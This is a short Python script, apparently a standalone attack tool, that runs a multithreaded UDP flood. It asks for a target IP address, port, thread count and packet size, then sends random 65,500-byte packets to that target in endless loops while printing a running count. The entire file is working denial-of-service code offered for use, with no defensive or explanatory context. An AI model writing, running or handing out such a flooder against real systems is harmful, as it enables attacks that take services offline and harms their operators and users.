import socket
import threading
import random
import sys
import os
import ctypes

def start(ip, port, size, i): #machine
    zzz = 0
    data = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        data.sendto(random._urandom(size), (ip, port)) #this mf is stronk packet
        zzz += 1
        print(f"CONNECTIONS: {zzz} | TARGET: {ip}:{port}")


def main():
    try:
        if len(sys.argv) < 5: #banner
            print('''
    ┌─┐┬ ┬┌┬┐┌─┐─┐ ┬┬ ┬┌─┐
    └─┐│ │ │││ │┌┴┬┘└┬┘┌─┘
    └─┘└─┘─┴┘└─┘┴ └─ ┴ └─┘
          udp flood\n''')

        ip= input("IP: ") if len(sys.argv) < 2 else sys.argv[1]
        port= int(input("Port: ") or 80) if len(sys.argv) < 3 else int(sys.argv[2])
        threads= int(input("Threads: ") or 1) if len(sys.argv) < 5 else int(sys.argv[4])
        size = int(65500) if len(sys.argv) < 4 else int(sys.argv[3])

    except KeyboardInterrupt:
        print("Program terminated by user")
        sys.exit()

    except Exception as e:
        print(f"\n<<ERROR>> {e}") #useless
        sys.exit()

    for i in range(threads): #threadin stronk as size of packets
        try:
            t = threading.Thread(target=start, args=(ip, port, size, i))
            t.start()
        except Exception as e:
            print(f"\n<<ERROR>> An error occurred initializing thread {i}: {e}")

if __name__ == "__main__":
    main()

